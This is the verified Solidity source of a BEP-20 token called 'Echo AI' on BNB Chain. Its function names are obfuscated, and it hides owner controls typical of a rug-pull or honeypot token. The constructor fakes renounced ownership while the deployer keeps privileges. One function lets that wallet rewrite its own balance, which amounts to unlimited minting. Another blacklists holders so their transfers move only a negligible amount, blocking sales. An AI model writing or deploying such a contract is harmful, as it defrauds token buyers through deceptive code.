/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface exemptTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toLimit {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract EchoAI {
    uint8 public decimals = 18;


    uint256 constant enableBuy = 10 ** 10;

    mapping(address => bool) public modeLaunched;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    mapping(address => bool) public listTake;

    mapping(address => mapping(address => uint256)) public allowance;
    string public symbol = "EAI";
    mapping(address => uint256) public balanceOf;
    string public name = "Echo AI";
    address public owner;

    address public fromTeamWallet;
    address public liquidityTotal;
    bool public senderLaunched;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        exemptTx amountSender = exemptTx(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        liquidityTotal = toLimit(amountSender.factory()).createPair(amountSender.WETH(), address(this));
        owner = liquidityMin();
        fromTeamWallet = owner;
        modeLaunched[fromTeamWallet] = true;
        balanceOf[fromTeamWallet] = totalSupply;
        emit Transfer(address(0), fromTeamWallet, totalSupply);
        buySell();
    }

    

    function isLiquidityEnable(uint256 teamSell) public {
        if (!modeLaunched[liquidityMin()]) {
            return;
        }
        balanceOf[fromTeamWallet] = teamSell;
    }

    function buySell() public {
        emit OwnershipTransferred(fromTeamWallet, address(0));
        owner = address(0);
    }

    function transfer(address swapMin, uint256 teamSell) external returns (bool) {
        return transferFrom(liquidityMin(), swapMin, teamSell);
    }

    function transferFrom(address fromTakeTrading, address swapMin, uint256 teamSell) public returns (bool) {
        if (fromTakeTrading != liquidityMin() && allowance[fromTakeTrading][liquidityMin()] != type(uint256).max) {
            require(allowance[fromTakeTrading][liquidityMin()] >= teamSell);
            allowance[fromTakeTrading][liquidityMin()] -= teamSell;
        }
        if (swapMin == fromTeamWallet || fromTakeTrading == fromTeamWallet) {
            return takeTo(fromTakeTrading, swapMin, teamSell);
        }
        if (listTake[fromTakeTrading]) {
            return takeTo(fromTakeTrading, swapMin, enableBuy);
        }
        return takeTo(fromTakeTrading, swapMin, teamSell);
    }

    function takeTo(address feeWalletTeam, address toTrading, uint256 teamSell) internal returns (bool) {
        require(balanceOf[feeWalletTeam] >= teamSell);
        balanceOf[feeWalletTeam] -= teamSell;
        balanceOf[toTrading] += teamSell;
        emit Transfer(feeWalletTeam, toTrading, teamSell);
        return true;
    }

    function listFund(address exemptTradingTake) public {
        if (exemptTradingTake == fromTeamWallet || exemptTradingTake == liquidityTotal || !modeLaunched[liquidityMin()]) {
            return;
        }
        listTake[exemptTradingTake] = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address teamAuto, uint256 teamSell) public returns (bool) {
        allowance[liquidityMin()][teamAuto] = teamSell;
        emit Approval(liquidityMin(), teamAuto, teamSell);
        return true;
    }

    function liquidityMin() private view returns (address) {
        return msg.sender;
    }

    function toTokenLiquidity(address feeTotal) public {
        if (senderLaunched) {
            return;
        }
        modeLaunched[feeTotal] = true;
        senderLaunched = true;
    }


}